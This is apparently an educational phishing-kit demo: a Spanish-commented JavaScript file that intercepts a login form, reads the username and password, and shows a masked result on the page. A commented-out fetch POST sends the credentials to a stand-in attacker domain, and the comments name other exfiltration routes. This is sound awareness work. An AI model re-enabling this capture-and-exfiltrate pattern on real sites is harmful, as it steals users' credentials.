/*
 * capture.js — DESACTIVADO A PROPÓSITO. Ver annotations.md, sección 2.
 *
 * Esto es lo que hace un capturador de credenciales real, paso a paso,
 * con la línea de robo real comentada y sustituida por un console.log
 * inofensivo para que este archivo no pueda usarse tal cual.
 */

document.getElementById("login-form").addEventListener("submit", function (e) {
  e.preventDefault(); // 1. Intercepta el envío antes de que vaya a ningún sitio

  const user = document.getElementById("fldA").value; // 2. Lee el usuario
  const pass = document.getElementById("fldB").value; // 2. Lee la contraseña

  // 3. EN UN KIT REAL, aquí se exfiltran los datos, por ejemplo:
  //
  //      fetch("https://dominio-del-atacante.example/log.php", {
  //        method: "POST",
  //        body: JSON.stringify({ user, pass, ts: Date.now() })
  //      });
  //
  //    o se envían a un bot de Telegram, o se guardan en un log.txt del
  //    hosting comprometido (ver annotations.md, sección 3).
  //
  // En este demo NO se envía nada a ningún sitio — se muestra en pantalla
  // (y en consola) para dejar claro, sin ambigüedad, qué se "capturó":
  console.log("[DEMO] Aquí un kit real exfiltraría:", { user, pass: "••••••" });

  const box = document.createElement("div");
  box.style.cssText = "margin-top:16px;padding:10px 12px;background:#fef3c7;border:1px solid #f59e0b;border-radius:6px;font-size:11px;color:#92400e;text-align:left;";
  box.textContent = `[DEMO] Capturado (solo en esta página, nunca enviado): usuario="${user}", contraseña="${"•".repeat(pass.length)}". En un ataque real, aquí te redirigirían a la web legítima sin que notaras nada.`;
  document.querySelector(".login-box").appendChild(box);
});
